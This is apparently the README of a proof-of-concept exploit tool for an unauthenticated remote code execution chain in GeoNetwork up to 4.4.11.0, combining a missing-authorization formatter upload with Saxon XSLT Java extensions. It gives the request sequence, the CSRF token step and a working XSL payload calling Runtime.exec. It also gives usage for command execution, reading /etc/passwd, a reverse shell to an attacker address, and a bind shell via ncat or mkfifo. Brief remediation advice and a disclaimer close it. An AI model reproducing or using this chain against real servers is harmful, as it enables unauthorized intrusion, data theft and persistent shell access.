# GeoNetwork PreAuth RCE - CVE-2026-63219 + CVE-2026-58400

A proof-of-concept exploit for an unauthenticated remote code execution chain in GeoNetwork versions up to and including 4.4.11.0.

---

## Overview

GeoNetwork is an open-source geospatial metadata catalog built on Java/Spring. This exploit chains two vulnerabilities to achieve unauthenticated RCE:

| CVE | Type | CVSS | Component |
|-----|------|------|-----------|
| CVE-2026-63219 | Missing authorization on formatter upload | 8.6 | `FormatterAdminApi` |
| CVE-2026-58400 | Saxon XSLT Java extension execution | 9.1 | Saxon-HE processor |

**Affected versions:** GeoNetwork <= 4.4.11.0  
**Authentication required:** None  
**Network access required:** Yes (HTTP)

---

## Vulnerability Details

### CVE-2026-63219 - Unauthenticated Formatter Upload

`FormatterAdminApi.uploadFormatter()` is missing the `@PreAuthorize` annotation that the rest of the admin API endpoints use. This means any unauthenticated user can POST a `.xsl` file to `/geonetwork/srv/api/formatters`.

Uploaded files are stored at:
```
/var/lib/geonetwork/data/formatter/<name>/view.xsl
```

The formatter name (and therefore the trigger path) is derived directly from the uploaded filename.

One non-obvious requirement: the request **must** include `Accept: application/json`. Without it, GeoNetwork's dispatcher returns a 500 "Service not found" before the upload handler is reached.

### CVE-2026-58400 - Saxon XSLT Java Extension RCE

GeoNetwork initializes the Saxon-HE XSLT processor with `ALLOW_EXTERNAL_FUNCTIONS=true`. Saxon's Java extension mechanism allows binding arbitrary Java class namespaces inside an XSL stylesheet:

```xml
xmlns:rt="java:java.lang.Runtime"
```

With this, `java.lang.Runtime.exec()` becomes callable directly from XSL, enabling OS command execution when a formatter is triggered.

Formatters are triggered via:
```
GET /geonetwork/srv/api/records/{UUID}/formatters/{formatterName}
```

A valid metadata record UUID is required in the URL - GeoNetwork validates it before invoking Saxon. Any existing record UUID in the catalog works; the XSL ignores the record content entirely.

### Reading Command Output

`Runtime.exec()` returns a `Process` object. Output is read through the process's `InputStream`. The reliable approach in Saxon is to wrap it with `InputStreamReader` -> `BufferedReader` and call `readLine()`:

```xml
<xsl:variable name="rt"   select="rt:getRuntime()"/>
<xsl:variable name="proc" select="rt:exec($rt, ('bash', '-c', 'id'))"/>
<xsl:variable name="is"   select="proc:getInputStream($proc)"
                          xmlns:proc="java:java.lang.Process"/>
<xsl:variable name="isr"  select="isr:new($is)"/>
<xsl:variable name="br"   select="br:new($isr)"/>
<result><xsl:value-of select="br:readLine($br)"/></result>
```

Each method call must be assigned to its own `xsl:variable`. Chained calls (e.g. `sc:next(sc:useDelimiter($s,'\A'))`) fail silently in Saxon because the intermediate return value is not correctly retained between calls.

### CSRF Bypass

Spring's CSRF protection requires a valid token for state-changing requests. GeoNetwork uses the double-submit cookie pattern:

1. Send a GET to `/api/me` — the response sets an `XSRF-TOKEN` cookie
2. Echo that value in the `X-XSRF-TOKEN` request header on the POST

No login is needed; the token is handed out to unauthenticated requests.

---

## Exploit Flow

```
Attacker                                  GeoNetwork
   |                                        |
   |-- GET /api/me ---------------------->  |
   |<-- Set-Cookie: XSRF-TOKEN=<tok> -----  |
   |                                        |
   |-- POST /api/formatters ------------->  |  (CVE-2026-63219)
   |   X-XSRF-TOKEN: <tok>                  |  writes malicious.xsl to disk
   |   file=malicious.xsl                   |
   |<-- 201 Created ----------------------  |
   |                                        |
   |-- GET /api/records/{UUID}/             |
   |       formatters/malicious -------->   |  (CVE-2026-58400)
   |                                        |  Saxon loads view.xsl
   |                                        |  Java Runtime.exec() fires
   |<- <result>uid=999(geonetwork)</result> |
   
```

---

## Usage

### Requirements

```bash
pip install requests
```

Python 3.7+ only, no other dependencies.

### RCE Verification

```bash
python3 geonetwork_preauth_rce.py -t http://target
```

Runs `id` and prints the result. Confirms the full chain works.

### Single Command (in-band output)

```bash
python3 geonetwork_preauth_rce.py -t http://target -c "cat /etc/passwd"
python3 geonetwork_preauth_rce.py -t http://target -c "ls -la /home"
python3 geonetwork_preauth_rce.py -t http://target -c "ss -tlnp"
```

Output is returned directly in the HTTP response (up to 10 lines). For longer output:

```bash
python3 geonetwork_preauth_rce.py -t http://target -c "cat /etc/passwd | head -20"
```

### Interactive Pseudo-Shell

```bash
python3 geonetwork_preauth_rce.py -t http://target --interactive
```

```
geonetwork$ id
uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)
geonetwork$ hostname
geonetwork-prod
geonetwork$ exit
```

Each command uploads a fresh formatter and triggers it. Slower than a real shell but reliable for enumeration.

### Reverse Shell

```bash
# Start listener first
nc -lvnp 4444

# Then trigger
python3 geonetwork_preauth_rce.py -t http://target --shell 10.10.10.10 4444
```

The reverse shell payload is base64-encoded before embedding in the XSL to avoid XML special character issues with `>&` redirect operators.

### Bind Shell

```bash
python3 geonetwork_preauth_rce.py -t http://target --bind 9001
```

Opens a listening shell on the target. The exploit tries `ncat -e` first and falls back to a `mkfifo` named pipe if `ncat` is unavailable. Connect with:

```bash
nc <target-ip> 9001
```

---

## Example Output

```
╔══════════════════════════════════════════════════════════════╗
║   GeoNetwork <= 4.4.11.0 - Unauthenticated RCE               ║
║   CVE-2026-63219 (Unauth Upload) + CVE-2026-58400 (XSLT)     ║
╚══════════════════════════════════════════════════════════════╝

[*] Hedef  : http://target.example.com
[*] Fetching XSRF token...
[+] Token  : b2014ff7-1711-4888-a865-4163cb853448
[*] Fetching metadata UUID...
[+] UUID   : c3d4e5f6-789a-bcde-f012-333333333333
[+] RCE CONFIRMED: uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)
```

---

## Why Other Approaches Failed

During development, several XSLT output-reading approaches were tested:

| Approach | Result | Reason |
|----------|--------|--------|
| `Scanner.useDelimiter('\A').next()` | Empty output | Saxon doesn't retain intermediate return value in chained calls |
| `Runtime.exec($rt, 'id')` (string) | Error | Saxon requires `String[]`; use sequence `('bash','-c','cmd')` |
| Reverse shell with `0>&1` in XSL | Broken redirect | `&` must be `&amp;` in XML; bash receives it literally |
| Reverse shell with base64 payload | Works | Avoids all XML escaping issues |
| `BufferedReader.readLine()` | Works | Single method call, single return value — Saxon handles it correctly |

---

## Remediation

- Apply the vendor patch that adds `@PreAuthorize("hasAuthority('Administrator')")` to `FormatterAdminApi.uploadFormatter()`
- Set `ALLOW_EXTERNAL_FUNCTIONS=false` in Saxon configuration as defense-in-depth
- Restrict network egress from the GeoNetwork process

---

## References

- https://ethiack.com/info-hub/research/geonetwork-preauth-RCE
- https://docs.geonetwork-opensource.org/
- https://www.saxonica.com/documentation/index.html#!extensibility/functions

---

## Disclaimer

This tool is intended for authorized penetration testing and security research only. Use against systems you do not own or have explicit written permission to test is illegal.
